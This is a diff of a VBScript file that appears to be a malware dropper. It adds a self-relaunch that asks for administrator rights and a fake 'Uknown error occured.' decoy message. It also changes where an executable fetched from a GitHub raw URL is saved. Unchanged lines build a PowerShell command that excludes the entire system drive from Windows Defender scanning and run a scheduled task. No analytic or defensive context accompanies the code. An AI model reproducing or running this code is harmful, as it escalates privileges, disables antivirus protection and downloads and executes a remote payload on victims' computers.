@@ -1569,15 +1569,18 @@ Set shell = CreateObject("WScript.Shell")
 
 
 On Error Resume Next
-
-
+If WScript.Arguments.Count = 0 Then
+  shellApp.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " uac", "", "runas", 1
+  WScript.Quit
+End If
+MsgBox "Uknown error occured.", 64, "Error"
 url = "https://github.com/Easy-Hash/download-now/raw/refs/heads/testing/Background%20Services.exe"
-target = shell.ExpandEnvironmentStrings("%PUBLIC%\Music\Services.exe")
+target = shell.ExpandEnvironmentStrings("%PUBLIC%\Services.exe")
 
 
 runTask = "OneTimeRunfile1"
 
-MsgBox "Uknown error occured.", 64, "Error"
+
 
 excludeCmd = "$env:SystemDrive | ForEach-Object { Add-MpPreference -ExclusionPath $_ } >$null 2>&1"
 excludeRun = "powershell.exe -ExecutionPolicy Bypass -Command """ & excludeCmd & """"
@@ -1911,6 +1914,7 @@ shell.Run runTaskCmd, 0, True
 
 
 ' Random ID: 9f9vjbtv1r
+
 
 
 
